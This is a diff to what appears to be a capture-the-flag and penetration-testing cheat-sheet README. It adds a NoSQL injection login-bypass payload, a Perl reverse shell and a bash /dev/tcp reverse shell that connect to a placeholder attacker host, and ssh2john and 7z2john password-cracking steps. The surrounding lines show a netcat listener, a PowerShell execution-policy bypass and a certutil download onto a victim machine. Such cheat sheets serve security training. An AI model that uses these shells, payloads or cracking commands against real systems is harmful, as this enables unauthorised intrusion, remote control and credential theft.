@@ -263,6 +263,11 @@ To bypass execution policy
 > $ powershell.exe -exec bypass
 ```
 
+### NOSql Code Injection.
+```
+username[$ne]=help&password[$ne]=help&login=login
+```
+
 ## Web Hacking
 
 ### Five Stages of Web Hacking
@@ -343,6 +348,16 @@ To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen 
 
 ```
 > $ nc -lvp <ATTACKER_PORT>
+```
+
+If website is launching perl reverse shell, we can modify it to get better shell using Bash oneliner.
+
+```
+> $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"<HOST_IP>:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' 2>&1
+```
+
+```
+> $ bash -c 'bash -i &> /dev/tcp/<HOST_IP>/9001 0>&1'
 ```
 
 ### BufferOverflow
@@ -475,6 +490,18 @@ To break Vigenere ciphers without knowing the key.
 
 ### One Time Pad Cipher
 To solve One Time Pad, Use [OTP](http://rumkin.com/tools/cipher/otp.php).
+
+### 7z Password Cracking
+
+To extract 7z password, Use tool `7z2john`
+
+### SSH Password Cracking
+
+To crack encrypted ssh key use `ssh2john` tool.
+
+```
+> $ /usr/share/john/ssh2john.py id_rsa > output.hash
+```
 
 ## Forensics
 
@@ -735,8 +762,18 @@ www-data@machine:/var/www/html$ export TERM=xterm
 - In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
 
 
-
 ## Tools
+
+- [Total Commander](www.ghisler.com) - Multi purpose terminal.
+- [CTF Exploitation](https://github.com/Gallopsled/pwntools) - CTF Exploitation Framework 
+- [Gobuster](https://github.com/OJ/gobuster) - Directory Enumeration.
+- [Nmap Automator](https://github.com/21y4d/nmapAutomator) - Nmap Automation Script.
+- [Quipqiup](https://quipqiup.com/) -  - Substitution Cipher Solver
+- [GDB Peda](https://github.com/longld/peda) - Peda Extension for GDB Debugger.
+- [Search Code](https://searchcode.com/) - Based on Funcion name and code-snippet.
+- [Juice Shop](https://github.com/bkimminich/juice-shop) - Highly vulnerable web app.
+- [OWASP Test Checklist](https://github.com/tanprathan/OWASP-Testing-Checklist) - OWASP Test Checklist.
+- [Pspy](https://github.com/DominicBreuker/pspy) - Information on cronjobs, proceses on target system.
 
 ### Reconnoitre
 Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
@@ -744,18 +781,6 @@ Security tool for multithreaded information gathering and service enumeration wh
 ```
 > $ reconnoitre -t 10.10.10.37 -o `pwd` --services`
 ```
-
-- Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
-- CTF Exploitation Framework : GitHub.com/Gallopsled/pwntools `pip install pwntools`
-- When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
-- Dirbuster for enumeration web server Attacks.
-- [Gobuster](https://github.com/OJ/gobuster) - Used for advanced enumeration.
-- [Nmap Automator](https://github.com/21y4d/nmapAutomator)
-- 7z Password Cracking: Use tool `7z2john`
-- SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
-- [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
-- [GDB Peda](https://github.com/longld/peda)
-- [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)
 
 ## How To Contribute
 Please follow the instructions in [CONTRIBUTING](contributing.md) file and beware of [CODE_OF_CONDUCT](code-of-conduct.md).
